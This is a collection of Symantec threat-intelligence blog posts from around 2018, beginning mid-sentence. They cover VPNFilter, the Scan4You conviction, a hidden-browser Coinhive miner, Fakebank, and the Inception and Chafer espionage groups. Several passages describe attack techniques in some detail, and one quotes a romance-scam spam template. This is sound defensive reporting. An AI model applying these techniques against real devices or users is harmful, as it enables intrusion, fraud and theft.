living off the land tactics, it also employs custom malware (Infostealer. Catchamas), particularly against computers of interest. Catchamas is a custom Trojan designed to steal information from an infected computer and contains additional features designed to avoid detection. From the initial alert triggered by TAA, we were able to follow a trail that eventually enabled us to see the bigger picture of a cyber espionage campaign originating from computers within China and targeting multiple organizations in the U. S. and Southeast Asia. Espionage is the group’s likely motive but given its interest in compromising operational systems, it could also adopt a more aggressive, disruptive stance should it choose to do so.

    "text": "UPDATE: September 26, 2018:This blog has been updated to include new information that was released by Cisco Talos on seven new Stage 3 modules. For further details see below. UPDATE: June 6, 2018:This blog has been updated to include new information that was released by Cisco Talos. This includes an expanded list of vulnerable devices and details on a newly discovered stage 3 module known as “ssler” which could permit the attackers to perform man-in-the-middle (MitM) attacks on traffic going through vulnerable routers and allow them to intercept web traffic and insert malicious code into it. For further details see below. A new threat which targets a range of routers and network-attached storage (NAS) devices is capable of knocking out infected devices by rendering them unusable. The malware, known as VPNFilter, is unlike most other IoT threats because it is capable of maintaining a persistent presence on an infected device, even after a reboot. VPNFilter has a range of capabilities including spying on traffic being routed through the device. Its creators appear to have a particular interest in SCADA industrial control systems, creating a module which specifically intercepts Modbus SCADA communications. According to new research from Cisco Talos, activity surrounding the malware has stepped up in recent weeks and the attackers appear to be particularly interested in targets in Ukraine. While VPNFilter has spread widely, data from Symantec's honeypots and sensors indicate that unlike other IoT threats such as Mirai, it does not appear to be scanning and indiscriminately attempting to infect every vulnerable device globally. Q: What devices are known to be affected by VPNFilter? A: To date, VPNFilter is known to be capable of infecting enterprise and small office/home office routers from Asus, D-Link, Huawei, Linksys, MikroTik, Netgear, TP-Link, Ubiquiti, Upvel, and ZTE, as well as QNAP network-attached storage (NAS) devices. These include: Q: How does VPNFilter infect affected devices? A: Most of the devices targeted are known to use default credentials and/or have known exploits, particularly for older versions. There is no indication at present that the exploit of zero-day vulnerabilities is involved in spreading the threat. Q: What does VPNFilter do to an infected device? A: VPNFilter is a multi-staged piece of malware. Stage 1 is installed first and is used to maintain a persistent presence on the infected device and will contact a command and control (C&C) server to download further modules. Stage 2 contains the main payload and is capable of file collection, command execution, data exfiltration, and device management. It also has a destructive capability and can effectively “brick” the device if it receives a command from the attackers. It does this by overwriting a section of the device’s firmware and rebooting, rendering it unusable. There are several known Stage 3 modules, which act as plugins for Stage 2. These include a packet sniffer for spying on traffic that is routed through the device, including theft of website credentials and monitoring of Modbus SCADA protocols. Another Stage 3 module allows Stage 2 to communicate using Tor. A newly discovered (disclosed on June 6) Stage 3 module known as “ssler” is capable of intercepting all traffic going through the device via port 80, meaning the attackers can snoop on web traffic and also tamper with it to perform man-in-the-middle (MitM) attacks. Among its features is the capability to change HTTPS requests to ordinary HTTP requests, meaning data that is meant to be encrypted is sent insecurely. This can be used to harvest credentials and other sensitive information from the victim’s network. The discovery of this module is significant since it provides the attackers with a means of moving beyond the router and on to the victim’s network. A fourth Stage 3 module known as “dstr” (disclosed on June 6) adds a kill command to any Stage 2 module which lacks this feature. If executed, dstr will remove all traces of VPNFilter before bricking the device. Details on seven more Stage 3 modules were released on September 26, 2018. These include: “tcpvpn”: Allows establishment of a Reverse-TCP VPN on compromised devices, enabling remote attacker to access internal networks behind infected devices. Q: What should I do if I’m concerned my router is infected? Concerned users are advised to use Symantec's free online tool to help check if their router is impacted by VPNFilter. This also includes instructions on what to do if the router is infected. Q: What do the attackers intend to do with VPNFilter’s destructive capability? A: This is currently unknown. One possibility is using it for disruptive purposes, by bricking a large number of infected devices. Another possibility is more selective use to cover up evidence of attacks. Q: Do Symantec/Norton products (Win/Mac/NMS) protect against this threat? A: Symantec and Norton products detect the threat asLinux. VPNFilter. Acknowledgement:Symantec wishes to thank Cisco Talos and the Cyber Threat Alliance for sharing information on this threat in advance of publication. UPDATE:Netgear is advising customers that, in addition to applying the latest firmware updates and changing default passwords, users should ensure that remote management is turned off on their router. Remote management is turned off by default and can only be turned on using the router's advanced settings. To turn it off, they should go to www.routerlogin.net in their browser and log in using their admin credentials. From there, they should click \"Advanced\" followed by \"Remote Management\". If the check box for \"Turn Remote Management On\" is selected, clear it and click \"Apply\" to save changes. UPDATE May 24, 2018:TheFBI has announcedthat it has taken immediate action to disrupt the VPNFilter, securing a court order, authorizing it to seize a domain that is part of the malware's C&C infrastructure. Meanwhile, Linksys is advising customers to change administration passwords periodically and ensure software is regularly updated. If they believe they have been infected, a factory reset of their router is recommended. Full instructions can be found here. MikroTik has said that it is highly certain that any of its devices infected by VPNFilter had the malware installed through a vulnerability in MikroTik RouterOS software, which was patched by MikroTik in March 2017. Upgrading RouterOS software deletes VPNFilter, any other third-party files and patches the vulnerability. UPDATE May 25, 2018:QNAP has published asecurity advisory on VPNFilter. It contains guidance on how to use the company’s malware removal tool to remove any infections.

    "text": "Two men have been found guilty of charges relating to the operation of Scan4You, a scanning service that allowed malware authors to check if their creations were detected by security products. The men were arrested overseas last year. Symantec assisted the case by testifying in court for the prosecution. Jurijs Martisevs pleaded guilty in March to charges of conspiracy and aiding and abetting computer intrusions. Ruslans Bondars was found guilty in a Virginia court yesterdayof conspiracy to violate the Computer Fraud and Abuse Act; conspiracy to commit wire fraud; and computer intrusion with intent to cause damage, and aiding and abetting. Sentencing is scheduled for September. The maximum penalties for conspiracy are five years in prison, a fine of $250,000, full restitution and forfeiture of any proceeds of the crime. The maximum penalties for computer intrusion are 10 years in prison, a fine of $250,000, full restitution and forfeiture of any proceeds of the crime. Scan4You ran from at least 2009 until 2016. Advertised on underground forums used by the cyber crime community, it was used by at least 30,000 customers. Bondars was responsible for the technical side of the service, maintaining its infrastructure and website. Martisevs took care of customer support, usually via email or instant messaging. The FBI investigation found that one Scan4You customer used the service to test malware that was then used to steal approximately 40 million credit and debit card numbers from a string of U. S. retailers. One retailer alone lost approximately $292 million from the attack. Scan4You was also used to develop the notorious Citadel financial Trojan which infected over 11 million victims worldwide and was used to steal over $500 million from victims. Symantec’s Vikram Thakur was called by the prosecution as an expert witness during the case. Thakur explained how legitimate malware scanning services work by analyzing submitted files and listing which security software vendors flag the file as malware and what they detect it as. After a file is scanned, the scan results are available to all vendors who subscribe to the service. This, Thakur said, was the crucial difference between legitimate services and their underground equivalents, whose results are shared with no one other than the person submitting the file. In order to run an underground malware scanning service, its operators would need to acquire security software from multiple vendors. Thakur told the court that use of Symantec products in any such service would be in violation of our End User License Agreement (EULA). “It’s important to distinguish between legitimate services, which allow the information security community to share information and protect customers, and illegal services which simply help malware authors try evade detection,” said Thakur. “Symantec is always happy to assist law enforcement agencies in prosecuting cyber crime.” Symantec's Security Response organization develops and deploys new security content to Symantec customers.

    "text": "Some of the key takeaways fromMarch’s Latest Intelligence, and the threat landscape in general, include an insight into what the Inception Framework group has been up to for the past three years, the email malware rate increases for the second month in a row, and malware that conducts browser-based cryptocurrency mining without a browser. Following a significant drop in January (1 in 786 emails, down from 1 in 431 the previous month), the email malware rate rose in February and that increase continued into March. However, the increase was slight, up to 1 in 635 emails, compared to 1 in 645 for February. The Mining sector continued to have the highest email malware rate, increasing from 1 in 461 emails in February to 1 in 308 for March. In March, Symantec discovered a new cryptocurrency mining malware (Trojan. Coinminer). However, this malware is not like most coinminers—it uses an interesting technique involving browser-based coin miningwithout any visible signs of a browser being used. One advantage of this type of threat for attackers is that coin mining may not be suspected for any CPU slowdown and instead the user may blame installed software for the problem. There was an increase in the rate of phishing emails in March, up from 1 in 3,331 emails in February to 1 in 2,981 in March. Agriculture, Forestry, & Fishingwas the sector with the highest rate in March, with 1 in 1,394 received emails being a phishing attempt. The cyber espionage group known as Inception Framework is using new types of lure documents in its spear-phishing campaigns and its malware has expanded to use new types of plugins,according to research published by Symantec in March. The group has remained active over the past three years, using cloud and the Internet of Things (IoT) to hide in plain sight. The group has been targeting organizations on several continents since 2014. It wasfirst exposed by Blue Coat (now part of Symantec) in December 2014targeting the Energy and Defense sectors, and organizations in the Consultancy/Security, Aerospace, Research, and Media sectors, in addition to embassies. However, the group appeared to fall quiet in late 2014 only to return in April 2015. Symantec has kept a close eye on the group’s activities, including changes in targeted regions. While there were no new Android malware families discovered in March, the threat to mobile devices is still as serious as ever. This is highlighted in this year’sISTR (volume 23), which shows that new mobile malware variants increased by 54 percent in 2017, andan average of 24,000 malicious mobile applications were blocked by Symantec every single day. Whenever there’s an event that generates interest online it’s inevitable that there will be scams trying to take advantage of the social media engagement that follows. This year’s Oscars ceremony was no exception and it wasn’t long beforebots began targeting the Twitter accounts of award winnersin order to spread gift card spam campaigns. The bots created fake accounts with similar handles to the real celebrities’ accounts. They then began replying to tweets in the real celebrities’ feeds. These replies contained spam links and were upvoted by other bot accounts so that the maximum number of people would see them. This is just a snapshot of the news for the month.

    "text": "Browser-based cryptocurrency mining is making a lot of headlines recently and is affecting millions of users. This type of activity doesn’t take over your computer or steal your personal information, instead its goal is to use your CPU cycles to earn money. As covered in ourprevious cryptocurrency mining blog,browser-based mining activity exploded in the last few months of 2017. While this type of coin mining can be done in a legitimate way, where the user is informed and consent given for the mining taking place, it is illegitimate mining that concerns us. So far we’ve seen JavaScript and also WebAssembly (WASM) files being used for browser-based mining, but what’s next? How about browser-based coin mining that doesn’t involve a browser being opened? While this may sound strange, we recently came across a case where this method was being used. The case involved a portable executable file launching a web-based coinminer script to begin mining for cryptocurrency. Let’s take a closer look. The file in question is a .net executable file (0x231a3fbbc025c659be407c316aba4392f8a13915f08580398bca21082723dbf8), and .net executable files can contain various element to define different resources used by the executable. One of the resources defined within the resource section of this executable defines a user interface window (aka a form) named Form1. When we looked closer at the code that defines this form, we saw that it contained a script tag that references the Coinhive in-browser mining script, which is a clue to what this executable might do. Figure 1 shows that the JavaScript contains a reference to hxxps://coinhive[.]com/lib/miner.min.js and we already know that the Coinhive script is used for browser-based coin mining. This made us wonder what this JavaScript was doing in a PE file, so we dug a little deeper and found that it used some rather interesting techniques. The first thing we noticed after executing the file was that while mining was taking place and the Coinhive website was being visited, we didn’t see any browser running in the background. So how exactly is this JavaScript executed? This WebBrowser class enables the malware to navigate web pages inside the form and, as long as the form remains hidden, there will not be any visible cues that a browser is running. We can see in Figure 2 that a component resource manager is created of type Form1. We saw earlier how the Coinhive script is referenced in the code of Form1. The TextBox1. Text string of Form1 contains the JavaScript shown in Figure 1, which is responsible for the coin-mining activity. Also, a class named WebBrowser1 is created of WebBrowser class. This WebBrowser class enables the malware to navigate web pages inside the form and, as long as the form remains hidden, there will not be any visible cues that a browser is running. In Figure 3 we can see that the Webrowser1. DocumentText property of the WebBrowser class is given the value of TextBox1. Text, which is the JavaScript in the resource section responsible for coin mining. ThisDocumentTextproperty of theWebBrowserclass manipulates the contents of an HTML page displayed in theWebBrowsercontrol using string processing tools. This means that theNavigating,Navigated, andDocumentCompletedevents occur when this property is set, and the value of theURLproperty is no longer meaningful so will be ignored. Instead, the DocumentText property is loaded by the browser object which causes the coin-mining script to run. This gives the effect of running web browser based functionality but without a browser to be seen. To make sure that the mining restarts after each reboot, the originally executed PE file is also added to the Startup folder with the name windata0.exe. The usual tell-tale sign of browser-based coin mining is a sudden, unexpected and sustained ramp up in CPU activity. This usually manifests itself as sluggishness in the computer’s performance. When these symptoms are encountered while browsing the internet, a user might suspect that browser mining is taking place. But with an executable based browser miner, like the one discussed in this blog, the user won’t see any browser windows open so may not suspect the slowdown to be a symptom of coin mining and may, for example, blame installed software for the problem. However, using some simple tools allows us to see what’s responsible for maxing out the CPU. Using Windows Task Manager we can confirm the CPU load on the computer and, with some additional system analysis tools, we can see a number of network connections being made to coinhive.com, which confirms the presence of a miner using Coinhive scripts. We can also capture WebSocket traffic using network analysis tools and see the traffic sent between the miner and the server, which may include calculated hashes sent to the mining pool while the mining code is running. As already mentioned, browser-based miners became quite prevalent in the last few months of 2017. We can see the percentage change when looking at our network protection telemetry. Even with the recent large drops in cryptocurrency values since late January, incidents of browser-based cryptocurrency mining remains high. As we have seen in this blog, the criminals behind illegitimate mining continue to find new ways to highjack their victims’ processing power in order to enrich themselves. Symantec will continue to monitor their activities and respond in kind.

    "text": "Coin mining, ransomware, targeted attacks, mobile security, and attacks leveraging the software supply chain. These are just some of the topics that made headlines in infosec in 2017 and which are covered in ISTR 23, your comprehensive guide to the cyber security threat landscape, which isavailable to download now. The biggest trend in 2017 was the explosion in cryptocurrency coin mining. The surge in interest in this area was such that detections of coinminers on endpoint computers in 2017 surged by 8,500 percent. A coinminer is a file or script that is used to mine cryptocurrencies such as Monero. Cyber criminals started trying to make money this way primarily because there was a huge rise in the value of cryptocurrencies in the last quarter of 2017, making this type of cyber crime extremely profitable. Cyber criminals use coinminers to steal victims’ computer processing power and cloud CPU usage to mine cryptocurrencies. The barrier to entry for coin mining is pretty low—potentially only requiring a couple of lines of code to operate—and coin mining can allow criminals to fly under the radar in a way that is not possible with other types of cyber crime. Victims may not even realize a coinminer is slurping their computer’s power as the only impact may be a slowdown of their device that they could easily attribute to something else. However, coin mining on a device could potentially cause batteries to overheat and devices to become unusable. Coin mining also has implications for organizations. Self-propagating coinminers may require corporate networks to be shut down. Coin mining in the cloud also has financial implications for organizations that are being billed based on CPU usage. While malicious coinminers appear to thus far be primarily targeting computers, and mobile phones to some extent, as it evolves cyber criminals may increasingly target IoT devices. We observed a 600 percent increase in overall attacks on IoT devices in 2017, showing that while they didn’t make headlines like they did thanks to theMirai botnet in 2016, they are still very much a target for cyber criminals. Ransomware made headlines in 2017 thanks to theWannaCry ransomware(Ransom. WannaCry) andPetya/NotPetya(Ransom. Petya), which was a destructive wiper that masqueraded as a ransomware. However, these were not “typical” ransomware attacks, and both appear to have been the work of targeted attack groups, rather than typical cyber criminals. They were part of a new trend we have observed where ransomware is being used by targeted attack groups as a decoy, to cause disruption or, in the case of WannaCry, to try and generate revenue. The “traditional” cyber crime ransomware market made a “correction” in 2017, with fewer new ransomware families and lower ransom demands. Ransomware’s profitability in 2016 led to a crowded market and overpricing of ransom demands, but in 2017 cyber criminals seemed to find the sweet spot that victims are willing to pay. The average ransom demand in 2017 was $522, less than half of the average of 2016. Ransomware variants increased by 46 percent in 2017, which indicates that established cyber crime groups are still quite active, but there was a drop in the number of new families discovered. This may indicate less innovation on behalf of cyber criminals, and may be a sign that their focus is currently elsewhere. Some online banking threats experienced a renaissance in 2017 as ransomware groups sought to diversify, while many cyber criminals may also have focused on coin mining while cryptocurrency values were high. In this year’s ISTR we also examined the tools, tactics, and motivations of targeted attack groups. There are currently 140 targeted attack groups actively tracked by Symantec. We found that overall targeted attack activity increased by 10 percent in 2017, and the primary motive of 90 percent of groups was intelligence gathering. However, one-in-ten groups was also engaged in some kind of disruptive activity. Analysis also showed that the use of “living off the land” tools and techniques is still favored by many attack groups. The use of zero days continues to fall out of favor for many groups, with only 27 percent of the targeted attack groups known to Symantec having ever used zero days. There was an average of one supply chain attack every month in 2017, compared to four attacks annually in previous years. Somewhat related to this is another trend we observed in 2017: an increase in software update supply chain attacks. This attack type sees attackers inject malware implants into the supply chain to infect unsuspecting victims. This type of attack was the initial infection vector for the Petya/NotPetya malware, which used a Trojanized update for a Ukrainian accounting software to gain a foothold on corporate networks, before eventually spreading worldwide using the EternalBlue exploit and other methods. There was an average of one supply chain attack every month in 2017, compared to four attacks annually in previous years. These types of attacks allow attackers to infiltrate well protected networks by exploiting weaker links in their software supply chain. Threats on the mobile threat landscape continued to grow in 2017. New mobile malware variants increased by 54 percent, and an average of 24,000 malicious mobile applications were blocked every single day. The threat from grayware increased in 2017 as well. Grayware encompasses apps that aren’t entirely malicious but can be troublesome, and this type of threat increased by 20 percent compared to 2016. The challenge of ensuring mobile security is also exacerbated by the high percentage of devices, particularly Android devices, running outdated mobile operating systems. Only 20 percent of mobile devices are running the latest major release of Android, meaning 80 percent of devices are missing out on protections contained in that update.

    "text": "We’ve recently come across a new malicious behavior among apps infected withAndroid. Fakebank: interception of phone calls made by users to their banks. These apps are sourced from third-party Android markets and some social media sites. We’ve discovered 22 apps so far, targeting Korean bank clients. The Fakebank variants we’ve seen in the past usually collect bank SMS, record phone calls to banks, and display a fake bank login UI. This new variant, however, is able to intercept calls both incoming and outgoing. When the app is launched, it collects and submits user’s personal information to a command and control (C&C) server, and presents its display (Figure 1). The server will respond with configuration specifying the phone numbers that will be used in the scam (Figure 2). Four numbers are passed to the malware app: This allows the app to deceive users, when the configured phone numbers appear for an outgoing or incoming call: When users call a real banking phone number, the malware is able to intercept and transfer the call to the scammer’s configured phone number. When a call comes in from a scammer, the app will overlay a fake UI dialog that spoofs a legitimate bank caller ID and number. The APIs and associated permission used to carry out this deception (android.permission. SYSTEM_ALERT_WINDOW) have evolved across Android versions. This malware optimizes its version targets to avoid requesting permissions from the user: In addition to tricking users into conversations with scammers, this malicious app sends call events to the C&C server. It also has a number of layouts customized to popular phone layouts in Korea.

    "text": "The cyber espionage group known as the Inception Framework has significantly developed its operations over the past three years, rolling out stealthy new tools and cleverly leveraging the cloud and the Internet of Things (IoT) in order to make its activities harder to detect. Since 2014, Symantec has found evidence of a steady stream of attacks from the Inception Framework targeted at organizations on several continents. As time has gone by, the group has become ever more secretive, hiding behind an increasingly complex framework of proxies and cloud services. The Inception Framework has been active since at least May 2014 and its activities werefirst exposed by Blue Coat (now part of Symantec) in December 2014. Right from the start, the group stood out because of its use of an advanced, highly automated framework to support its targeted attacks. This level of sophistication is rarely seen, even in the targeted attacks sphere. The nature of Inception’s targets, from 2014 right through to today, along with the capabilities of its tools, indicate that espionage is the primary motive of this groups In 2014, Inception was compromising targeted organizations using spear-phishing emails, which masqueraded as legitimate emails concerning international policy, upcoming conferences, and specific sectoral interests of the targeted organization. More than half of the group’s earlier targets were in the Energy or Defense sectors, but it also targeted organizations in the Consultancy/Security, Aerospace, Research, and Media sectors, in addition to embassies. Its activities ranged across the globe, with targets located in South Africa, Kenya, the United Kingdom, Malaysia, Suriname, along with several other European and Middle Eastern countries. Word documents attached to Inception’s spear-phishing emails leveraged two Microsoft Office vulnerabilities (CVE-2014-1761andCVE-2012-0158) to install malware on the recipient’s computer. The malware had a multi-staged structure that began with a malicious RTF document and ended with an in-memory DLL payload that communicated, via the WebDAV protocol, with a command and control (C&C) address from a legitimate cloud service provider (CloudMe.com). The name “Inception” comes from the group’s many levels of obfuscation and indirection it employed in delivering this payload. Further layers of obfuscation emerged when Blue Coat was able to determine that the attackers were communicating with CloudMe.com through a hacked network of compromised routers, the majority of which were located in South Korea. Following its exposure in late 2014, Inception fell quiet. However, this turned out to be only a brief hiatus and, by April 2015, there had been a resurgence in activity. Attacks have continued since then, right through to 2017. In the intervening years, the Inception Framework has evolved, adding additional layers of obfuscation in a bid to avoid detection. The group is using new types of lure documents in its spear-phishing campaigns and its malware has expanded to use new types of plugins. Inception has also increased its use of the cloud, and diversified the range of cloud providers it uses for C&C purposes. The locations of Inception’s targets have shifted since 2014, but the group continues to have a global reach. Russia accounted for the largest number of attacks between 2015 and 2017, followed by Ukraine, Moldova, Belgium, Iran, and France. Since 2014, the Inception Framework has steadily changed its tools and techniques. In its early attacks, the group’s malware payload (with the exception of plugins) was fully contained within an exploit document emailed to the victim. In more recent activity, these spear-phishing attacks are now a two-stage process. The group will first email the target a malicious “Reconnaissance document” which, if opened, willfingerprint the target computer, gathering information on what software it is running and whether that software is up to date. Several days later, Inception will send a second spear-phishing email to the target, with another malicious document attached. This document is designed to retrieve a remote RTF file, which contains the exploit, and open it on the target’s computer. Shortly after this RTF document is opened, the remaining stages of the Inception malware are found executing on the system. The loader DLL is responsible for decrypting and injecting the core payload DLL into memory, from an encrypted file present on disk. The core payload DLL's main function is to gather system information, execute other malware in the form of plugins, and update itself. It accesses C&C via WebDAV hosted on legitimate cloud storage providers. The use of an initial reconnaissance document allows Inception to profile the target’s computer and potentially customize any subsequent malicious document to exploit known vulnerabilities in unpatched software on the computer. By breaking its attacks up into distinct stages, Inception also makes them harder to detect. For investigators to trace an attack, each stage will have be uncovered and referenced to the other stages. Inception’s malware is modular and the attackers will load plugins based on requirements for each attack. The group has used a range of plugins in recent attacks, some of which are improved versions of plugins used in 2014, while others were previously unseen. Since 2014, Inception has widened its use of cloud service providers for C&C purposes. Whereas previously it relied on one service provider (CloudMe.com), more recently it has employed a least five cloud service providers Leveraging the cloud for C&C has a number of advantages for groups like Inception. Any C&C communications will involve encrypted traffic to a known website, meaning it is less likely to raise flags on targeted networks. Legitimate cloud services are not likely to be blacklisted. Varying the cloud service provider used adds a further degree of stealth. Once it became known Inception was using a single provider, any traffic to that provider may have attracted additional scrutiny. Symantec has notified all cloud providers affected. Where possible Symantec has provided details on the C&C accounts used by Inception to the affected cloud providers. The accounts in questions have been deleted or disabled. Inception is continuing to use chains of infected routers to act as proxies and mask communications between the attackers and the cloud service providers they use. Certain router manufacturers have UPnP listening on WAN as a default configuration. Akamai research has found that there are 765,000 devices vulnerable to this attack. These routers are hijacked by Inception and configured to forward traffic from one port to another host on the internet. Abuse of this service requires no custom malware to be injected on the routers and can be used at scale very easily. Inception strings chains of these routers together to create multiple proxies to hide behind. Every connection builds different chains of infected routers and once the connection is complete, it cleans up after itself. In several cases, Symantec has been able to follow the entire chain of compromised routers and found it led to a virtual private server (VPS), meaning the attackers have employed an additional layer of security by routing communications through rented hosting servers. Inception has an ongoing interest in mobile devices and has previously developed malware to infect Android (Android. Lastacloud), iOS (IOS. Lastaccoud) and BlackBerry devices (BBOS. Lastacloud). Mobile malware continues to be deployed and the group has made some modifications to its Android malware. The malware is spread via SMS messages and emails containing malicious links. Once installed, it uses user profile pages on online forums as dead drops for its C&C. Even prior to its discovery in 2014, Inception went to great lengths both to avoid detection and conceal its location. Exposure hasn’t deterred the group. Instead, it has redoubled its efforts, adding more layers of obfuscation to an already complex attack framework. Its persistence, stealth, and global reach mean the group continues to pose an ongoing risk to organizations, particularly in its areas of interest, which include defense, aerospace, energy, governments, telecoms, media, and finance. Aside from a suite of advanced modular malware, the group is notable for its ability to make use of new platforms such as the cloud, IoT, and mobile to facilitate its attacks. An “early adopter”, Inception’s tactics may point the way towards how other espionage groups may modify their methods in years to come. Symantec has had protection for all of the Inception Framework tools since the initial emergence of the group in 2014.

    "text": "Some of the key takeaways fromFebruary’s Latest Intelligence, and the threat landscape in general, include the Chafer attack group mounts further operations against targets in the Middle East, the email malware rate remains low, and a mobile threat attempts to log into Facebook accounts to steal credentials. After a significant drop last month, the email malware rate rose again in February. However, at 1 in 645 emails, the current rate is still quite a bit lower than what was generally seen in the second half of 2017. This is likely due to lower levels of email activity by the Necurs botnet, little of which served up malware during February. The Chafer attack group has been observed carrying out further operations against organizations in the Middle East, according tonew research by Symantec. The group has been seen working its way further into targets in the telecom and transport industries, using new tools to traverse the networks, primarily to carry out surveillance activities. This recent activity indicates that the group remains highly active, working to hone its tools and tactics. The global spam rate declined slightly in February, dropping to 55.1 percent. However, the rate remains above 55 percent, as it has for 6 of the last 7 months. The Finance, Insurance, & Real Estate sector tops our list of industry spam rates, while last month’s top sector, Mining, dropped to fifth place. While quiet on the email malware front, there were a couple large spam runs sent by the Necurs botnet during the month. The first run was a continuation of a run we mentioned last month:a classic fake romance-themed scam, using a simple subject line of “hi”. This scam continued into February and the lead-up to Valentine’s Day, offering the semblance of a romantic encounter in order to scam the user. Hi [YOUR EMAIL HANDLE], My name is [RANDOM NAME] and i'm writing you to tell you that you are super cute from your photos on Facebook. I myself am from Russia, but now I live in the USA. I want to get to know you more! If you have the same, email me, this is my email [PREDETERMINED DOMAIN]. Lets know each other better. The second major Necurs campaign came later in the month and contained an attached PDF with advertisements for online pharmaceuticals. The subject lines were a random “Offer”, “Discount”, “Sale”, “Coupon”, or “Final sale”, followed by a random 7- to 9-digit number. The phishing rate dropped in February, coming in at 1 in 3,331 emails. While slightly lower than January, overall rates have hovered in the 1 in 2,000-3,000 range for the last 10 months. The Agriculture, Forestry, & Fishing sector had the highest industry phishing rate with 1 in 1,854 emails, followed by Retail Trade at 1 in 2,505 emails. A phishing scam mimicking a customer service notice from Netflix has been making the rounds, attempting totrick recipients into divulging personally identifiable informationsuch as credit card numbers. The phishing emails attempt to trick a user into believing their Netflix membership will be suspended if they do not validate their billing information. Manual sharing topped social media scams in February, comprising 62.78 percent of scams, while Fake Offers dropped more than 10 percentage points, from 29.75 percent to 19.49 percent. Coming in third for February, Like Jacking increased 1.29 percentage points at 17.25 percent. A newly discovered version of the Fakeapp Android malware familyhas been discovered by Symantec researchersattempting to log into Facebook accounts in order to steal user names and passwords, as well as a variety of personal details available in the user’s profile. The threat gains access to the user’s account by displaying a fake login page once it has compromised the device. The threat will periodically display this message until the user credentials or the threat is removed. This is just a snapshot of the news for the month.

    "text": "Chafer, the Iran-based targeted attack group, mounted further operations throughout 2017, attacking more organizations in the Middle East and beyond, and deploying several new tools. The group staged a number of ambitious new attacks last year, including the compromise of a major telecoms services provider in the region. There is also evidence that it attempted to attack a major international travel reservations firm. Chafer appears to be primarily engaged in surveillance and tracking of individuals, with most of its attacks likely carried out to gather information on targets or facilitate surveillance. Chafer has been active since at least July 2014 and its activitieswere first exposed by Symantec in December 2015, when it was found to be conducting targeted surveillance of domestic and international targets. At the time, many of its targets were individuals located in Iran, and it had already begun compromising telecom providers as well as airline companies in the Middle East region. Chafer appears to have been undeterred by its exposure in 2015 and continued to be very active during 2017, using seven new tools, rolling out new infrastructure, and attacking nine new target organizations in the region. The group hit organizations in Israel, Jordan, the United Arab Emirates, Saudi Arabia, and Turkey. Sectors targeted included airlines; aircraft services; software and IT services companies serving the air and sea transport sectors; telecoms services; payroll services; engineering consultancies; and document management software. Outside of the Middle East, Symantec has also found evidence of attacks against one African airline and attempts to compromise an international travel reservations firm. One of the organizations compromised by Chafer in 2017 was a telecoms services provider in the Middle East, which sells its solutions to multiple telecoms operators in the region. The ultimate goal of the attack may have been to facilitate surveillance of end-user customers of telecoms operators. By moving two steps up the supply chain the attackers could potentially have carried out surveillance on a vast pool of end-users. Alongside evidence of compromise of the organization itself, Symantec also found a copy of one of the company’s own files, relating to its messaging software, on a staging server used by Chafer. The file was in a directory alongside a number of hacking tools used by the attackers. A second target outside the Middle East provides further confirmation of Chafer’s heightened ambitions in recent times. Symantec found evidence that it had tried to compromise a large international travel reservations firm. There was no indication that the attack was successful, but Chafer did successfully infiltrate an African airline that is a customer of the reservations firm. The group hit organizations in Israel, Jordan, the United Arab Emirates, Saudi Arabia, and Turkey. Sectors targeted included airlines; aircraft services; software and IT services companies serving the air and sea transport sectors; telecoms services; payroll services; engineering consultancies; and document management software. In the earlier attacks from 2015, Symantec found evidence that Chafer had been compromising targeted organizations by attacking their web servers, likely through SQL injection attacks, in order to drop malware onto them. In 2017, the group added a new infection method to its toolkit, using malicious documents which are likely circulated using spear-phishing emails sent to individuals working in targeted organizations. These documents were Excel spreadsheets. When opened, they downloaded a malicious VBS file that in turn ran a PowerShell script. Several hours later, a dropper would appear on the compromised computer. This would install three files on the computer, an information stealer, a screen capture utility, and an empty executable. The screen capture utility appeared to be used for initial information gathering, as it was only used briefly at the beginning of each infection and not seen again. The information stealer was capable of stealing the contents of the clipboard, taking screenshots, recording keystrokes and stealing files and user credentials. After this initial activity, the attackers usually downloaded more of their tools to the computer using a PowerShell downloader and began moving across the victim’s network. Symantec has seen Chafer use seven new tools in its more recent campaigns, in addition to malware it is previously known to have used. Most of the new tools are freely available, off-the-shelf tools, put to a malicious use. The new tools include: Chafer has also continued to use tools previously associated with the group, including its own custom backdoor Remexi (Backdoor. Remexi); the aforementioned PsExec; Mimikatz (Hacktool. Mimikatz), a free tool capable of changing privileges, exporting security certificates, and recovering Windows passwords in plaintext; Pwdump (Pwdump) a tool that is used to grab Windows password hashes from a remote Windows computer; and Plink (PuTTY Link) a command-line utility used to create reverse SSH sessions. Chafer has used these tools in concert to traverse targeted networks. The group has recently adopted NSSM to maintain persistence and install the service which runs Plink on the compromised computer. Plink is then used to open reverse SSH sessions from the attacker's server to the RDP port on the victim computer. This presumably gives them RDP access to the compromised computer. Once a foothold is established, the attackers use PsExec, Remcom, and SMB hacking tools to begin moving across the victim’s network. Chafer has also begun using new infrastructure. The domain win7-updates[.]com is being used by the group as a command and control address. The domain has been referenced several times in command lines, e.g: It has also been embedded in a dropper: Symantec also discovered multiple IP addresses that were used as infrastructure by the attackers. It is unclear whether these were leased or hijacked, but the fact that many of them appear to follow a pattern—with the latter three numbers of each address often running in sequence—makes it likely they were deliberately selected by the attackers. In one case, Symantec found what appeared to be a staging server used by the attackers. The server belonged to one of the targeted organizations. Copies of many of the tools used by the group were discovered on the server. The attackers didn’t even bother hiding their activity and saved items to the desktop, often without renaming them. Chafer’s activities have some links to another group known as Crambus (aka Oilrig). Both groups have been observed using the same IP address for command and control purposes. In addition to this, both groups have been seen using a similar infection vector, namely an Excel document which drops a malicious VBS file. Both VBS files reference the same file path, containing the same misspelling: Are the two groups one and the same? While this may be a possibility, at present there isn’t enough evidence to support that hypothesis. What is more likely is that the two groups are known to each other and enjoy access to a shared pool of resources. Chafer’s recent activities indicate that the group remains highly active, is continuing to hone its tools and tactics, and has become more audacious in its choice of targets. Although a regional actor, the group has followed two trends seen globally among targeted attack groups. The first is a greater reliance on freely available software tools, also known as “living off the land.” By limiting their use of malware, groups such as Chafer hope to be less conspicuous on a victim’s network and, if discovered, make their attack more difficult to attribute. The second trend is towards attacks on the supply chain, compromising organizations with the goal of then attacking the customers, or even the customers of the customers, of those organizations. These attacks require more “steps” to reach their ultimate target, which adds additional time and risk for attackers to reach their targets. However these attacks also leverage trusted channels into the eventual target, e.g., through a trusted supplier, allowing attackers to potentially circumvent security systems at the organization they ultimately wish to compromise. These attacks are riskier but come with a potentially higher reward and, if successful, could give the attackers access to a vast pool of potential targets. Chafer’s recent activities indicate that the group remains highly active, is continuing to hone its tools and tactics, and has become more audacious in its choice of targets.

